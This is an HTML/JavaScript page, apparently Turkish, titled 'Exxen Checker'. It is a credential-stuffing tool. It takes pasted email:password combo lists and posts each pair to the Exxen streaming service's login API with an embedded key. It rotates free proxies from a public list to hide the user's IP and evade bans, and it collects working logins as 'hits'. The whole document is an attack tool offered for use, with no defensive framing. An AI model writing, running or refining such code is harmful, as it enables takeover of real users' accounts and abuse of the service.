<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exxen Checker</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f2f2f2;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            text-align: center;
            color: #333;
        }
        label {
            font-weight: bold;
        }
        textarea {
            width: 100%;
            height: 150px;
            margin-bottom: 10px;
            padding: 5px;
            border: 1px solid #ccc;
            border-radius: 5px;
            resize: vertical;
        }
        button {
            display: block;
            margin: 10px auto;
            padding: 10px 20px;
            background-color: #4CAF50;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        #results {
            margin-top: 20px;
            padding: 10px;
            background-color: #f9f9f9;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        #results p {
            margin: 5px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Exxen Checker</h1>
<p>V2 de IP adresiniz gizlendi, gizlemek için pr0xy kullanıldı, IP ban oranı azaltıldı, checker farklı pr0xyler kullandığı için biraz hızlandı.</p>
        <textarea id="combos" placeholder="Mail:Şifre"></textarea>
        <button onclick="checkCombos()">Check</button>
        <button onclick="copyHits()">Copy Hits</button>
        <div id="results"></div>
    </div>

    <script>
async function getProxies() {
    try {
        const response = await fetch('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=500&country=all&ssl=all&anonymity=all');
        const data = await response.text();
        return data.split('\n');
    } catch (error) {
        console.error('Proxy listesi alınamadı:', error);
        return null;
    }
}

        async function checkCombos() {
    const combosTextarea = document.getElementById('combos');
    const combos = combosTextarea.value.split('\n').map(line => line.trim());
    const results = document.getElementById('results');
    results.innerHTML = '';
    const proxies = await getProxies();

    console.log('Combos:', combos); // Kontrol için combos'un değerini loglayalım

    for (const combo of combos) {
        const [email, password] = combo.split(':');
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];

        console.log('Email:', email, 'Password:', password, 'Proxy:', proxy); // Kontrol için her adımda email, password ve proxy değerlerini loglayalım

        try {
            const response = await fetch(`https://api-crm.exxen.com/membership/login/email?key=90d806464edeaa965b75a40a5c090764`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8'
                },
                body: `Email=${email}&Password=${password}&RememberMe=true`,
                agent: proxy
            });
            const data = await response.json();
            if (data.Success) {
                results.innerHTML += `${email}:${password}<br>`;
            }
        } catch (error) {
            console.error('Hata:', error);
        }
    }
}

    </script>
</body>
</html>
